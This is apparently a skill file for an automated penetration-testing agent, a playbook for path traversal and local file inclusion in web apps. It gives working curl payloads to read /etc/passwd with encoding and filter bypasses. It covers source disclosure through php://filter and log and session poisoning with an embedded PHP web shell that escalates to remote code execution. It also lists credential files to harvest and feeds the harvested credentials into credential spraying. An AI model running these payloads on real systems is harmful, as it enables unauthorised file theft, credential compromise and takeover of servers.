---
name: web-lfi-traversal
description: Path traversal / Local File Inclusion detection→file-read→RCE for web apps. Use when a param names a file/path/page/template/lang/download, or a response embeds file contents. Triggers - file=/page=/path=/template=/lang=/download=/include= param, ../, %2e%2e, "no such file", directory listing, download endpoint.
tags: [vuln_assess, exploitation]
---

# Path Traversal / LFI

## When this fires
A param selects a file/page/template/language/download, or a download/include endpoint reflects file content.

## Detect
```bash
curl 'http://<t>/?page=../../../../etc/passwd'          # classic
curl 'http://<t>/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd'  # url-encoded
curl 'http://<t>/?page=....//....//etc/passwd'          # filter-strip bypass
```
`root:x:0:0` back = traversal/LFI. Windows: `..\..\..\windows\win.ini`.

## Decide
- Reads only (traversal) → escalate to source disclosure + secrets.
- PHP `include()` (LFI) → escalate to RCE via wrappers/poisoning.
- Extension appended (`page.php`) → `php://filter` (below) or null-byte on old PHP; try `?page=../../etc/passwd%00` (PHP<5.3.4).

## Exploit → PROVE IMPACT
```bash
# source disclosure (base64 so PHP doesn't execute it):
curl 'http://<t>/?page=php://filter/convert.base64-encode/resource=index.php' | base64 -d
# high-value reads: app config/.env, DB creds, SSH keys, /proc/self/environ, /proc/self/cmdline
# LFI → RCE paths:
#  log poisoning: inject <?php system($_GET[c]);?> into UA/referer → include /var/log/apache2/access.log
#  session poisoning: write PHP into a session var → include /var/lib/php/sessions/sess_<PHPSESSID>
#  php://input / data:// (if allow_url_include) ; /proc/self/environ (older)
#  php filter chain → RCE (php_filter_chain_generator) when only file-read is available
```
**Proof required:** contents of a file the app shouldn't return (`/etc/passwd`, an .env with creds), or `id` via an LFI→RCE chain. Harvested creds → add_credential + cred_spray.

## Tooling
`nuclei -tags lfi,traversal`; `ffuf` with an LFI wordlist on the param; php_filter_chain_generator for filter-only cases.

## False positives / pitfalls
- WAF/framework normalizes `../` → try encodings, `....//`, absolute paths, or a different param.
- App sandboxes to a base dir → look for a symlink/upload you control to include.
- 200 with generic page ≠ read — confirm the actual file bytes are in the response.
